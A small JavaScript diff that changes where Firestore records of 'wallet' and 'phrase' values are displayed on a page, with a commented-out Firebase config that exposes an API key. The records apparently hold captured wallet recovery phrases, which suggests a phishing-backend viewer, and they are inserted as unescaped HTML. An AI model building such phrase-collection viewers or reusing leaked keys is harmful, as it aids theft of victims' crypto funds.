@@ -9,6 +9,7 @@ import "https://code.jquery.com/jquery-3.6.1.min.js"
 
 
 
+
 // const config = {
 //   apiKey: "AIzaSyB121nMN9SwJ97w3VwviYzk7ZO9J_XhFcI",
 //   authDomain: "chainpadsolution.firebaseapp.com",
@@ -54,7 +55,7 @@ db.collection("datas").orderBy("time", "desc").get().then((querySnapshot) => {
     let phrase = doc.data().phrase
     let time = doc.data().time.toDate().toLocaleDateString("en-US", date_format)
 
-    $('body').append(`
+    $('.box').append(`
    <div>
     <p>${wallet}</p>
     <p>${phrase}</p>
